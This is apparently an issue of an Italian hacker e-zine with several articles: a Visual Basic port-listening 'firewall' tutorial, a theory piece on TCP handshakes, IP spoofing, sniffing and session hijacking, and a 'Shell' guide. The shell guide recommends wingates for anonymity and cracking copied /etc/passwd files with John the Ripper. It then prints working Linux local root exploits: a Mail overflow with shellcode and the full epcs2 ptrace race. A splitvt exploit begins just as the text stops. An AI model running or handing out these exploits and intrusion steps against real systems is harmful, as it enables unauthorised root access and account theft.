N.B. se il server non supportasse FXP ciccia, dovete tirarveli giu manualmente :


Giunto qua mi pare di aver dettagliatamente chiarito questo tips per copiare files

Ora scappo alla Prox.

Per chiarimenti o informazioni
c'e' la relativa email

byez

Data Socket Error
Transfer Failed
Connection Closed...


Saluti R|Ppy

rippy2k1@hotmail.com

Ringraziamenti e Saluti: a []LoRd[V]icio[] - Crashes - Quasar e a tutti i
membri della crew

------------------------------------*END*--------------------------------------

-------------------------------------[10]--------------------------------------
----------------------------------[ Evil ]-------------------------------------
---------------------------[Farsi un FireWall in VB]---------------------------

        _____________ _____  ____  ______  _____
         ____  ______/ __| | __/ /__/_  _/  _/ /
          __  / __   ____  |  / /  __/ / ___/ /
         __/ _____/     _| |_/ /____/ /____/ /
        __  / ___     ___| |/ / ___/ /_ __/ /_____
       __________/ _________ /  _/____/ _/________/
                                                   .::VBFireWall::.
OoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoO
io non mi ritengo responsabile di come utilizzerete le informazioni 
contenute in questa guida in quanto da me offerte a puro scopo 
informativo!! 
insomma in poche parole NON FATE CAZZATE!
è monotono il disclaimer vero? :)
OoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoO

questa guida è copyright di [Evil]
www.evil87.cjb.net


Saluti: NoFlyZone-Crew , Ness1 , Do^Sh1n , Tommy_ , 
        [killer] , CobWebX , BigAlex , Pipp0 , mightyinquisitor ,
        FeltonSpray , ReSiNaRo (resinaro lo ho messo per ultimo 
                                così evito prese per il culo da
                                un certo qualcuno =)

Fuck To: lamerz , finanza , pedofili , pippaioli , 
         macchine rosa , siti che loggano a tradimento l'ip ,
         prof di lettere , tirchi e ai conta balle ...

--------------------------
Firewall
--------------------------

In questo tutorial spiegherò come farsi un firewall personale in 5 minuti!
strumenti necessari

1-un cervello funzionate
2-il visual basic 6.0
3-pochissima conoscienza del linguaggio

Ora direi che siete pronti quindi:

Prima di tutto create un nuovo progetto e ci buttate dentro 2 textbox e 3 
comandi per winsock

quindi:

  +--------------------------------------+
  | |Text1 _____|                        |   
  |  ___________                         |   
  | |Text2      |                        |      
  |______________________________________| 

e oltre a questo i 3 comandi winsock li mettete dove volete
Dopo cliccate 2 olte sul form e cancellate quelle poche righe di codice
che troverete , al loro posto mettete:

Private Sub Form_Load()
    Winsock1.LocalPort = Val(110)
    Winsock1.Listen
    Winsock2.LocalPort = Val(25)
    Winsock2.Listen
    Winsock3.LocalPort = Val(80)
    Winsock3.Listen
End Sub

In questo modo con il codice:

Private Sub Form_Load()
    Winsock1.LocalPort = Val(110)
    Winsock1.Listen
    Winsock2.LocalPort = Val(25)
    Winsock2.Listen
    Winsock3.LocalPort = Val(80)
    Winsock3.Listen
End Sub

si fanno tenere in ascolto le porte 110 , 25 e 80 ai rispettivi Winsock così
facendo si potrà intercettare qualunque attacco a queste tre porte

ma se aggiungiamo questo?

Private Sub Winsock1_ConnectionRequest(ByVal requestID As Long)
    Text2.caption = "110"
    Winsock1.Close
    Winsock1.LocalPort = Val(110)
    Winsock1.Listen
End Sub

Invece facendo così si dice al winsock1 che in caso di connessione alla porta 
110 , fa visualizzare la porta attaccata nella textbox numero 2 , 
e poi chiude la connessione. 
in seguito la riapre per riprenderne il controllo in caso di un altra connessione
e così via per le altre porte , ma mettiamo caso che noi vogliamo anche che ci 
dia l'ip di chi ci ha attaccato quindi usiamo appunto la text2 , e per farlo
bisogna aggiungere il controllo per visualizzare l'ip dell'attaccante quindi 

    Text1.caption = Winsock1.RemoteHostIP

E magari far lampeggiare la barra dell'applicazzione ma , qui vi dovrei riportare
al tutorial pubblicato su www.evil87.cjb.net e www.noflyzone-crew.cjb.net

quindi il tutto sarebbe così:

Private Sub Form_Load()
    Winsock1.LocalPort = Val(110)
    Winsock1.Listen
    Winsock2.LocalPort = Val(25)
    Winsock2.Listen
    Winsock3.LocalPort = Val(80)
    Winsock3.Listen
End Sub

Private Sub Winsock1_ConnectionRequest(ByVal requestID As Long)
    lblip = Winsock1.RemoteHostIP
    lblporta = "110"
    Winsock1.Close
    Winsock1.LocalPort = Val(110)
    Winsock1.Listen
End Sub

Private Sub Winsock2_ConnectionRequest(ByVal requestID As Long)
    lblip = Winsock2.RemoteHostIP
    lblporta = "25"
    Winsock2.Close
    Winsock2.LocalPort = Val(25)
    Winsock2.Listen
End Sub

Private Sub Winsock3_ConnectionRequest(ByVal requestID As Long)
    lblip = Winsock3.RemoteHostIP
    lblporta = "80"
    Winsock3.Close
    Winsock3.LocalPort = Val(80)
    Winsock3.Listen
End Sub

Ed ecco qui tutto il programma , ovvero poche righe per un utile programma , 
volendo si possono aggiungere molte altre opzioni , ma per ora direi che basti
Divertitevi =)

/quit Evil
------------------------------------*END*--------------------------------------

================================================================================
--------------------------------------------------------------------------------
----------------------------------[THEORY]--------------------------------------
--------------------------------------------------------------------------------
================================================================================


------------------------------------[11]---------------------------------------
--------------------------------[CityHunter]-----------------------------------
-----------------------------[Spoofing vedente]--------------------------------


Ebbene...è giunto il momento da molti atteso(mah...), è finito il tempo dei
giochi e delle cazzatele, ora si fa sul serio!;-)
Prima di iniziare voglio precisare che quello che da qui in poi illustrerò
non è cosa spicciola e facile: qui siamo di fronte agli attacchi più seri e
di una certa complessità fattibile su una rete, sia questa una LAN o Internet.
Non fate cagate, per un buon Admin sgamarvi è cosa abbastanza facile, quindi
aspettate di sapere tutto, prima di provare! Incito invece, a chi ne ha la
possibilità, di provare su una LAN propria.
Quello che espongo qui oggi non è nulla di nuovo: Phrack, Morris e compagnia
ne hanno già parlato e molto!Ok?
Iniziamo!


----[TCP/IP]----


Farò una spiegazione abbastanza breve perchè ne ho già abbondantemente parlato
negli altri miei tut!

IP: è il protocollo che fornisce un servizio di distribuzione di datagrammi
inaffidabile.
Inaffidabile perchè non ci è data la garanzia che ciò che spediamo arrivi e in
che ordine(se arriva).Molto importante nel campo dello spoofing è l'header del
pacchetto, dove sono contenute le nostre"vitali" informazioni. Non sto qui a
farvi i vari schemini del caso perchè ho già messo tutto nei primi due tutz.

TCP:il nome in sè dovrebbe già dirvi a cosa serve...Transmission Control
Protocol. Bravi!Avete capito...tu?Là in fondo?Non hai capito...ok...spiego per
tutti:-) TCP è ciò che ci permette di trasferirei nostri file senza perdite di
dati(cosa che sarebbe molto probabilemente accaduta se avessimo usato solo IP),
che dà vita ai vari servizi quali Telnet, FTP, Http ecc.(se vi interessa la spe-
cifica ufficiale è nell'RFC 793).
Il trasferimento dati avviene in modo bufferizzato, cioè prima di effettuare una
trsmissione attraverso IP, il TCP attende di aver riempito un'area di memoria
(buffer appunto) con una quantità di dati che valga il costo della trsmissione:)
...è anche possibile forzare le trasmissioni...ma non ci riguarda da vicino!

Qui vi immetto lo schemino perchè ci tornerà utile in seguito:


+----------------------------------------------------------------------------+
|               |                       |                                    |
| IP Header     |      TCP Header       |          TCP Data                  |
|               |                       |                                    |
+----------------------------------------------------------------------------+
   Tutti e tre assieme formano il datagramma IP, gli ultimi due(quelli che ini-
   ziano con TCP per intenderci) il segmento inerente al TCP

Qui guardiamo con attenzione il TCP Header:

+------------------------------------------------------------------------------+
|    16 bit per la porta di partenza      | 16 bit per la porta di destinazione|
+------------------------------------------------------------------------------+
|                                  32 bit SEQ number                           |
+------------------------------------------------------------------------------+
|                                  32 bit ACK number                           |
+------------------------------------------------------------------------------+
|4 bit     |                                                                   |
|lunghezza |                       16 bit window size                          |
|header    |                                                                   |
+------------------------------------------------------------------------------+
|   16 bit checksum  |                  16 bit urgent pointer                  |
+------------------------------------------------------------------------------+
|                                 option                                       |
+------------------------------------------------------------------------------+
|                                  data                                        |
+------------------------------------------------------------------------------+

Ok...passiamo ad analizzare alcuni campi(quelli che più ci interessano):
i primi due sono la porta dell'host di partenza e quella di destinazione.
Ed ora arriviamo a ciò che più ci interessa:
il SEQ i l'ACK (ricordiamo anche la flag SYN che fa parte del datagramma IP...
ne parlo come se non fosse importante...mah...è importantissima cmq!!!)

SYN sta per SYNchronise, sincronizza i numeri SEQ dei due host;
ACK sta per ACKnowledge, riconosce i dati inviati dal peer;
FIN sta per FINished, l'origine ha terminato la trasmissione dei dati;
RST sta per ReSeT, rompe la connessione;
ci sarebbero anche PSH(push) e URG(urgent)...ma tanto già sapete tutto no;-)

Ora,tanto per capire meglio come avviene una connessione TCP/IP vi simulo un
inizio di connessione:siamo nel nostro bel computerino in casa alle 4 di notte
(o mattina??...mah...) e decidete di connettervi via telnet alla vostra backdoor
preferita(in questo caso potrebbe essere una sessione telnet)
Voi impersonate l'host A(scegliete...Attacker...Acker senza H....fate voi:-))
il server sarà l'host  B(bersaglio?:-))
Aprite il vostro bel telnet e connettetevi...vediamo ciò che succede nella
vostra bella connessione (per lo scopo, se volete provare, usatevi un bello
sniffer tipo TCPDump o cose simili...se ho tempo
vi metto un semplice sniffer allegato)(mi spiace...non faccio in tempo...devo
studiare!Cmq tcpdump dovrebbe esserci in ogni distribuzione...ed è sicuramente
meglio di quello che vi avrei dato io!!!)

(prima uno schema facile poi quello nel dattaglio)

   ---------------syn--------------->         1)
A) <----------syn [ack=(isn+1)]------  (B     2)
   ---------------[ack=(isn+1)]----->         3)

voi cercate di iniziare una connessione con B e gli spedite una bella SYN (passo
1) B risponde con la vostra SYN e il suo ACK (uguale all'ISN di A+1...dopo
questo passo lo spiego meglio)
ed infine A rimanda l'isn di B+1. Che fatica...credo non abbiate capito nulla,
vero? Ok...ci riprovo con un esempio più pratico:

A:190.10.10.1
B:190.10.10.2 (li ho usati simili per comodità...non implica che debbano essere
                nella stessa subnet)

salto la connessione telnet e arrivo al quid...il 3-WAY HANDSHAKE(applausi di
sottofondo)

190.10.10.1:69  >190.10.10.2:23   SEQ:1323466780  ACK:0           FLAGS: SYN
190.10.10.2:23  >190.10.10.1:69   SEQ:3242354354  ACK:1323466781  FLAGS: SYN ACK
190.10.10.1:69  >190.10.10.2:23   SEQ:1323466781  ACK:3242354354  FLAGS: ACK

dovreste ritrovarvi un po' vero?

Come promesso vi spiego l'ISN di cui non ho ancora parlato. ISN sta per initial
sequence number.
Il SEQ di A(primo dato trasmesso) prende anche il nome,appunto,di ISN.

Ok...mi pare proprio di aver detto tutto riguardo al 3-WH. Per vederlo
in pratica andate al tutz 2 e sniffatevi un po' o meglio ancora usate
tcpdump o sniffit!

DISCLAIMER
==========
Questo documento è stato sviluppato solo per scopo educativo, per
aiutare a capire le reti, ed aiutare i sysadmin a difendersi da eventuali
attacchi descritti in questo documento. Di conseguenza l'autore del
testo non si assume nessuna responsabilità su ciò che venga fatto
tramite queste informazioni, e non ne incita l'utilizzo per scopi fraudolenti.


----[IP SPOOFING]----


Per SPOOFING si intende quella tecnica(o insieme di tecniche) atta a costruire i
propri pacchetti IP con indirizzo di provenienza falso. Immaginate quanto questo
sia affascinante e utile ai nostri loschi scopi(dimenticavo...è un tutorial...
quindi di cose da bimbi cattivi non bisogna parlare, hihihihi).
Massimo anonimato, possibilità di scavalcare firewall(e tanto altro che lascio
alla vostra immaginazione) ...cosa volete di più dalla vita? Purtroppo tutto
questo ben di Dio non è proprio facile facile da ottenere.
Ma vediamo di distinguere un po' le cose: lo spoofing si divide in vedente e
cieco(che bravo che sono...ho pure messo la i in cieco:-))

Il vedente è un po' il fratellino minore...quello che che ancora non conosce
tutti gli angoli della sua casa e deve usare gli occhi per girarla(minchia che
esempio...cmq avete capito!)
Un po' più tecnicamente accade questo: abbiamo un bello sniffer installato nella
rete che vogliamo attaccare e grazie a lui possiamo vedere tutti i SEQ e ACK che
ci servono per instaurare una connessione così facendo siamo in grado di vedere
appunto ciò che accade e i dati che riceviamo(da qui "vedente").

In un attacco cieco invece le grane aumentano parecchio...non vedremmo alcun
dato tornare indietro(immaginate: impersoniamo il server A e vogliamo
connetterci a B usando l'indirizzo di C...secondo voi dove vanno i dato che B
manda?...Bravi!a C...e noi chi siamo? A...quindi? Non vedremo un beneamato cazzo)
e noi non saremo in grado di conoscere i SEQ e ACK necessari per la connessione
...dovremo proprio indovinarli.

----[Sniffing]----

E' la componente principale dello spoofing vedente. E' grazie a lui che riusciamo a
vedere i dati che ci interessano. Ma cos'è uno sniffer?
Uno sniffer è un programma che risiede in una LAN in attesa che qualche connessione
ci passi in mezzo. Esistono diversi tipi di sniffer, dai più semplici(come il mio
nel tutz 2) a quelli codati per registrare password e via dicendo...
Ma come funzionano in pratica? Il fattore principale per uno sniffer è avere accesso
root sulla macchina. Questo perchè quando facciamo partire il nostro gingillo questo
ha bisogno di mettere l'interfaccia di rete in modalità PROMISCUA e creare un socket
che acceda al livello dove passano i pacchetti incapsulati negli header dell'interfaccia
di rete. Sotto linux questo processo si ottiene grazie a SOCK_PACKET.
Creiamo quindi una chiamata così:

fd= socket(AF_INET, SOCK_PACKET, htons(ETH_P_ALL));
ETH_P_ALL specifica che stiamo usando ETHERNET. _P_ALL lo usiamo dal momento che vogliamo
ricevere tutti i pacchetti, non solo ad esempio gli IP(e in questo caso sarebbe ETH_P_IP)
Sotto <linux/if_ether.h> troviamo gli altri valori.

Ora mettiamo l'interfaccia di rete in modalità promiscua. Ma perchè metterla in questa
modalità vi starete chiedendo(male se non lo state facendo!:-))? Beh...
se non lo facessimo vedremmo i dati rivolti solo alla nostra macchina, invece così
riusciamo a vedere anche tutti quei pacchetti che passano dalla nostra macchina ma che non
sono rivolti a noi(vi ricordo che siamo in una LAN).
Chiamiamo quindi ioctl e settiamo la flag IFF_PROMISC con SIOCSIFFLAGS dopo aver agito
su una struttura ifreq e letto il contenuto dalla flag sempre grazie a SIOCSIFFLAGS.
Per dettagli maggiori vi rimando a <linux/if.h>.

Direi che con lo sniffing abbiamo terminato.


----[HIJACKING]----

L' Hijacking è una versione molto interessante dello spoofing vedente. Consiste
nel dirottamento della connessione in corso e nell'inserimento di dati nostri
nella connessione che vogliamo attaccare.
Che figata vero?:-)) C'è da precisare(purtroppo,altrimenti sarebbe il paradiso)
che questo tipo di spoofing lo si piò fare quasi unicamente quando A e C(vedi
sotto) sono nella stessa sottorete, quindi questo accade solitamente in una LAN.

Facciamo uno schemino che ormai ciò preso gusto:-))

I giocatori sono i soliti       A(noi)
                                B(bersaglio)
                                C(cazzone a cui rubiamo la connessione)

C <---------------------/---------------->B
                        |
                        |
                        /
                       /
       A-------------->

Ok,Ok...piccola spiegazione tecnica: in sostanza B e C entrano nello stato
ESTABLISHED dopo il 3-WH.
A questo punto l'attacco funge così: A inserisce nella connessione in corso tra
B e C dei dati desincronizzando la connessione legale e alterando la coppia SEQ/ACK
del server in faccia al client.

Per desincronizzare B e C come si fa?Pronti...ci sono tre bei
metodi:-):

1)Quando il server(A) si trova nel punto 2 dello schemino fatto sopra(quello del
TCP/IP) inviamo un bel pacchetto RST(chiaramente fingendo da parte del client)e
cerchiamo di instaurare una nuova connessione con un nuovo ISN. Il server
aggiornerà il suo ACK e cercherà di rispondere con un nuovo ISN. Noi
rispondiamo con un ACK all'ISN del server. Cosa succede quindi? Il client(C)
resta in stato ESTABLISHED ma sarà scoordinato rispetto al nuovo ISN del server
(A).

2)(Metodo più grezzo se vogliamo perchè meno occulto) Inviamo al client dei
messaggi ICMP del tipo HOST(port)_UNREACH(vedi nuker su IRC) e noi allegramente
ci impadroniamo della connessione.

3)(Quello che useremo) A connessione già avvenuta da Client e Server ci
connettiamo al server (chiaramente con l'IP del client...se no a che serve?:-)))
incrementando così l'ACK del server.Così facendo otteniamo la desincronizzazione
del client dal server e noi saremo nel flusso della connessione.

Ora si aprono due strade...un po' come l'amleto:occultati, o non accultati?
Questo è il dilemma!(era l'amleto vero?Che poi mi tiro la zappa sui piedi
facendo il figo:-)))
Mo' spiego: se optiamo per la prima scelta dobbiamo smistare i pacchetti diretti
dal server a noi e diretti al client giusto(man in the middle), altrimenti,nella
seconda ipotesi, lasciamo che il client blocchi la connessione(lasciandolo per
esempio in FIN_WAIT1. Nella parte che seguirà questo tutz, The Implementation,
vi proporrò un mio telnet hijacker...se intanto volete provare qualcosa cercatevi
HUNT. E' un ottimo hijacker che funge anche da man in the middle. Date
anche un'occhiata al codice, mi raccomando(se non guardate i sorgenti dei programmi
ma li seguite e basta sarete sempre dei lamah!Studaite quindi!)

Resta ancora da parlare dell'ARP spoofing, che rientra semrpe nel vedente, ma
ammetto di saperne poco. Invito quindi XpTerminator di scrivere lui questa parte!
Io vi lascio qui e mi sbatto a scrivervi un po' di codice! Voi fatemi sapere
se il lavoro che faccio vi piace, se vi fa schifo o cose simili!
Mi trovate su IRC in #noflyzone o scrivete a Vicio che mi passerà la mail!
Buono studio!

<<<<<<<<<<<<<<Hack The Planet>>>>>>>>>>>>>>>>>>>>>

P.S. i ringraziamenti: a me, perchè mi sto sbattendo un casino!!Bravo Ryo, continua
	così!:-DDD a Crashes, Vicio, Zukky83, [V]lad, anetrip,Xp, Deli, Pit, BIGA,
	MARSIO ecc.e a FuSyS, mio grande iniziatore grazie ai suoi progetti.


				alla prox				CityHunter


------------------------------------*END*--------------------------------------


------------------------------------[12]---------------------------------------
-----------------------------------[Evil]--------------------------------------
-----------------------------------[Shell]-------------------------------------

        _____________ _____  ____  ______  _____
         ____  ______/ __| | __/ /__/_  _/  _/ /
          __  / __   ____  |  / /  __/ / ___/ /
         __/ _____/     _| |_/ /____/ /____/ /
        __  / ___     ___| |/ / ___/ /_ __/ /_____
       __________/ _________ /  _/____/ _/________/
                                                      .::Shell::.
OoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoO
io non mi ritengo responsabile di come utilizzerete le informazioni
contenute in questa guida in quanto da me offerte a puro scopo
informativo!!
insomma in poche parole NON FATE CAZZATE!
OoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoO

# Ne io [Evil] ne gli autori degli exploit da mè offerti si assumono
# la responsabilità delle vostre azioni, quindi badate bene a quello
# che state facendo...

questa guida è copyright di [Evil]
www.evil87.cjb.net

Consumo: 1/2 Litro di thè
         1   Pacchetto di arachidi
Saluti: NoFlyZone-Crew , ^RoLLo^, [V]lad , CityHunter

Musica: Nirvana - smells like teens spirit , Sum41 - fat lip

--------------------------
Shell
--------------------------

1.Piccola introduzione

Una shell genericamente è un interprete di comandi, proprio come il
dos, quelle di cui parlerò hanno solo un utilità in più che capirete
continuando a leggere il tutorial...

2.Account

(Qui parlo di telnet ma un client per windows buonissimo, direi ottimo
è Putty che permette connesioni criptate SSH e via protocollo SSL, per
approfondire vi riporto al tutorial di lordvicio).

Putty : http://www.deaf.unipa.it/download/network/putty.exe

Per provare ad utilizzare la vostra prima shell dovete crearvi un
account, questo è possibile via telnet ( start -> esegui "telnet )
come esempio perdiamo cyberspace.org una freeshell abbastanza conosciuta

dal menù start andate su "esegui" e scrivete:

 telnet cyberspace.org

dovrebbe venire fuori una cosa come questa:

----------------------------------------------------
 Grex central timekeeping.  At the beep, the time is
  4:37AM on Sunday, 24 February 2002

 New to grex?  Type help at the login prompt

 (ttyrb) grex login:
----------------------------------------------------

a questo punto come login digitate newuser
scenderanno giù un pò di righe di testo, voi continuate a dare invio
ogni volta che lo chiede, quando vedete una cosa come questa:

----------------------------------------------------
Your current choice for the erase character is '^H'.
Please type that character, or another choice, or '?' for help:
----------------------------------------------------

voi premete il tasto backspace.
La stessa cosa vi viene chiesta per ^U voi premete ctrl+U (sono tutti
tasti per dare comandi) e infine per ^C premete ctrl+c (questo perchè
i comandi di solito viene più facile lasciarli standard)
dopo questo vengono giù altre righe che parlano dei terminali che
supporta.
Premete invio e alla domanda

----------------------------------------------------
What kind of terminal do you usually use?
----------------------------------------------------

scrivete 'vt100' (senza gli apici) che è il terminale standard per
connessioni telnet.
Bene ora veniamo alle domande sui dati personali sta a voi la scelta
di metterli veri o falsi (il 99% degli utenti mettono dati falsi)

N.B

^D = ctrl+D

dopo tutte le domande sui dati personali vi chiede il tipo di shell
che volete utilizzare, le possibilità sono sette:


        bbs     - the PicoSpan conferencing system
        csh     - the C shell
        tcsh    - an enhanced C shell
        sh      - the Bourne shell
        bash    - the GNU version of the Bourne shell
        lynx    - a fancy menu system.  You can select this if you know
                  what terminal type you are using.
        menu    - a simple menu system

quella che vi consiglio è la bash shell, facile semplice e completa
ora vi chiede che tipo di editor di testi volete usare e ve ne propone
cinque:

        pico    This is a simple screen-based editor designed for
                new users.  If you know what kind of terminal you're
                using, you can pick this.
        bbs     This is the traditional PicoSpan editor.  If you
                didn't know your terminal type, you should pick this.
        joe     This is another simple screen-based editor.  It's
                fairly new on Grex right now.
        emacs   This is the GNU Emacs editor.  If you've never heard
                of Emacs or never used it, don't pick this.
        vi      This is the traditional Unix "vi" editor.  If you've
                never heard of "vi" or never used it, don't pick this.

per i principianti sconsiglio vivamente VI, mentre consiglio pico il perchè
lo vedete anche dalla descrizione.
Scrivete pico e date invio, ora vi chiede il login scrivete quello che volete
e vi verrà chiesta la password immettetene una e se viene accettata vi verrà
chiesto di riscriverla, fate ciò che chiede e date invio, ora vi verranno
presentati i dati da voi immessi controllateli e se sono giusti scrivete done
ora vi si presenta una cosa come questa

Please wait, checking for duplicates /etc/passwd:  108 107 106 105 104 103 102 1
01 100 99 98 97 96 95 94 93 92 91 90 89 88 87 86 85 84 83 82 81 80 79 78 77 76 7
5 74 73 72 71 70 69 68 67 66 65 64 63 62 61 60 59 58 57 56 ecc....

se tutto va bene verrà fuori questo

-----
Thanks to the Ann Arbor Observer for the long-running Grex ad on arborweb.com

      Happy Birthday Jonathan (kingjon) Lovelace!

No mail.
-----

Ora riconnettetevi e inserite login e pass scelti prima (quando scrivete la
password non vedete nulla).
aspettate un'attimo e vedrete

bash-2.05$

questa è la bash-shell scelta prima che aspetta i vostri comandi provate questo

telnet cyberspace.org

questo è un minuto esempio di bouncing =)

3.Fottiamo qualche password

Prima di tutto l'anonimità , in questo caso sfruttiamo i wingate
per usarli andate su telnet e connettetevi all'host del wingate
se appare la scritta

Wingate

allora telnettatevi all'host della shell e siete a posto...
come ben tutti sapete (spero) le password dei sistemi unix vengono archiviate su

etc/passwd

peccato che siano criptate, beh tutto è facile con john the ripper, copiate
quello che è scritto sul file etc/passwd e fatelo decriptare da questo favoloso
programma.

Sò che questa ultima parte l'ho curata veramente poco ma solo per il fatto che
sarebbe andata a finire per una guida al cracking.
se siete interessati ne trovate a maree di guide su come crackare password unix
provate su google =)

4.Exploit

Qui di seguito riporto alcuni exploit utili per varie distro di linux:

   ------------------------Cut Here------------------------
#include <stdio.h>
#include <string.h>
#define GID    "\x03"

int main(int argc, char **argv) {
  char shellcode[] =
    "\x31\xdb\x31\xc9\xbb\xff\xff\xff\xff\xb1"GID"\x31"
    "\xc0\xb0\x47\xcd\x80\x31\xdb\x31\xc9\xb3"GID"\xb1"
     GID"\x31\xc0\xb0\x47\xcd\x80\xeb\x1f\x5e\x89\x76"
    "\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89"
    "\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89"
    "\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

  char buf2[10000];
  char buffer[15000];
  char nop[8000];
  char *p, *q;
  long ret=0xbfffffff;
  int len, offset = 0, i,j,k,ii;
  ret = ret - 5000;

  for(k=0; k<2000; k+=4)
    *(long *)&buf2[k] = ret;

  for(k=0;k<7000;k++){
    strcat(nop,"\x90");
  }
  snprintf(buffer,12000,"%s%s%s",nop,shellcode,buf2);
  printf("Crazy Mail sploit by kengz \n");
  printf("Hit    '  .  ' to go \n");
  execl("/usr/bin/Mail","Mail","x","-s","x","-c",buffer,0);
}
   ------------------------Cut Here------------------------

~Piccola spiegazione
  Questo exploit ti da l'id di bin in questo modo diventi user "bin"
  e avrai molti permessi sui file eseguibili (Slackware 7.1)

   ------------------------Cut Here------------------------
 *
 * epcs2 (improved by lst [liquid@dqc.org])
 * ~~~~~~~
 * exploit for execve/ptrace race condition in Linux kernel up to 2.2.18
 *
 * originally by:
 * (c) 2001 Wojciech Purczynski / cliph / <wp@elzabsoft.pl>
 *
 * improved by:
 * lst [liquid@dqc.org]
 *
 * This sploit does _not_ use brute force. It does not need that.
 * It does only one attemt to sploit the race condition in execve.
 * Parent process waits for a context-switch that occur after
 * child task sleep in execve.
 *
 * It should work even on openwall-patched kernels (I haven't tested it).
 *
 * Compile it:
 *	cc epcs.c -o epcs
 * Usage:
 *	./epcs [victim]
 *
 * It gives instant root shell with any of a suid binaries.
 *
 * If it does not work, try use some methods to ensure that execve
 * would sleep while loading binary file into memory,
 *
 * 	i.e.: cat /usr/lib/* >/dev/null 2>&1
 *
 * Tested on RH 7.0 and RH 6.2 / 2.2.14 / 2.2.18 / 2.2.18ow4
 * This exploit does not work on 2.4.x because kernel won't set suid
 * privileges if user ptraces a binary.
 * But it is still exploitable on these kernels.
 *
 * Thanks to Bulba (he made me to take a look at this bug ;) )
 * Greetings to SigSegv team.
 *
 * -- d00t
 * improved by lst [liquid@dqc.org]
 * props to kevin for most of the work
 *
 * now works on stack non-exec systems with some neat trickery for the automated
 * method, ie. no need to find the bss segment via objdump
 *
 * particularly it now rewrites the code instruction sets in the
 * dynamic linker _start segment and continues execution from there.
 *
 * an aside, due to the fact that the code self-modified, it wouldnt work
 * quite correctly on a stack non-exec system without playing directly with
 * the bss segment (ie no regs.eip = regs.esp change).  this is much more
 * automated.  however, do note that the previous version did not trigger stack
 * non-exec warnings due to how it was operating.  note that the regs.eip = regs.esp
 * method will break on stack non-exec systems.
 *
 * as always.. enjoy.
 *
 */

#include <stdio.h>
#include <fcntl.h>
#include <sys/types.h>
#include <signal.h>
#include <linux/user.h>
#include <sys/wait.h>
#include <limits.h>
#include <errno.h>
#include <stdlib.h>

#define CS_SIGNAL SIGUSR1
#define VICTIM "/usr/bin/passwd"
#define SHELL "/bin/sh"

/*
 * modified simple shell code with some trickery (hand tweaks)
 */
char shellcode[]=
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x31\xc0\x31\xdb\xb0\x17\xcd\x80"		/* setuid(0) */
	"\x31\xc0\xb0\x2e\xcd\x80"
	"\x31\xc0\x50\xeb\x17\x8b\x1c\x24"		/* execve(SHELL) */
	"\x90\x90\x90\x89\xe1\x8d\x54\x24"		/* lets be tricky */
	"\x04\xb0\x0b\xcd\x80\x31\xc0\x89"
	"\xc3\x40\xcd\x80\xe8\xe4\xff\xff"
	"\xff" SHELL "\x00\x00\x00" ;			/* pad me */

volatile int cs_detector=0;

void cs_sig_handler(int sig)
{
	cs_detector=1;
}

void do_victim(char * filename)
{
	while (!cs_detector) ;
	kill(getppid(), CS_SIGNAL);
	execl(filename, filename, NULL);
	perror("execl");
	exit(-1);
}

int check_execve(pid_t victim, char * filename)
{
	char path[PATH_MAX+1];
	char link[PATH_MAX+1];
	int res;

	snprintf(path, sizeof(path), "/proc/%i/exe", (int)victim);
	if (readlink(path, link, sizeof(link)-1)<0) {
		perror("readlink");
		return -1;
	}

	link[sizeof(link)-1]='\0';
	res=!strcmp(link, filename);
	if (res) fprintf(stderr, "child slept outside of execve\n");
	return res;
}

int main(int argc, char * argv[])
{
	char * filename=VICTIM;
	pid_t victim;
	int error, i;
	struct user_regs_struct regs;

	/* take our command args if you wanna play with other progs */
	if (argc>1) filename=argv[1];

	signal(CS_SIGNAL, cs_sig_handler);

	victim=fork();
	if (victim<0) {
		perror("fork: victim");
		exit(-1);
	}
	if (victim==0) do_victim(filename);

	kill(victim, CS_SIGNAL);
	while (!cs_detector) ;

	if (ptrace(PTRACE_ATTACH, victim)) {
		perror("ptrace: PTRACE_ATTACH");
		goto exit;
	}

	if (check_execve(victim, filename))
		goto exit;

	(void)waitpid(victim, NULL, WUNTRACED);
	if (ptrace(PTRACE_CONT, victim, 0, 0)) {
		perror("ptrace: PTRACE_CONT");
		goto exit;
	}

	(void)waitpid(victim, NULL, WUNTRACED);

	if (ptrace(PTRACE_GETREGS, victim, 0, &regs)) {
		perror("ptrace: PTRACE_GETREGS");
		goto exit;
	}

	/* make sure that last null is in there */
	for (i=0; i<=strlen(shellcode); i+=4) {
		if (ptrace(PTRACE_POKETEXT, victim, regs.eip+i,
						    *(int*)(shellcode+i))) {
			perror("ptrace: PTRACE_POKETEXT");
			goto exit;
		}
	}

	if (ptrace(PTRACE_SETREGS, victim, 0, &regs)) {
		perror("ptrace: PTRACE_SETREGS");
		goto exit;
	}

	fprintf(stderr, "bug exploited successfully.\nenjoy!\n");

	if (ptrace(PTRACE_DETACH, victim, 0, 0)) {
		perror("ptrace: PTRACE_DETACH");
		goto exit;
	}

	(void)waitpid(victim, NULL, 0);
	return 0;

exit:
	fprintf(stderr, "d0h! error!\n");
	kill(victim, SIGKILL);
	return -1;
}
   ------------------------Cut Here------------------------


   ------------------------Cut Here------------------------
/*
 * MasterSecuritY <www.mastersecurity.fr>
 *
 * spitvt.c - Local exploit for splitvt < 1.6.5
 * Copyright (C) 2001  fish stiqz <fish@analog.org>
 * Copyright (C) 2001  Michel "MaXX" Kaempf <maxx@mastersecurity.fr>
 *
 * Updated versions of this exploit and the corresponding advisory will
 * be made available at:
 *
 * ftp://maxx.via.ecp.fr/spitvt/
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or (at
 * your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
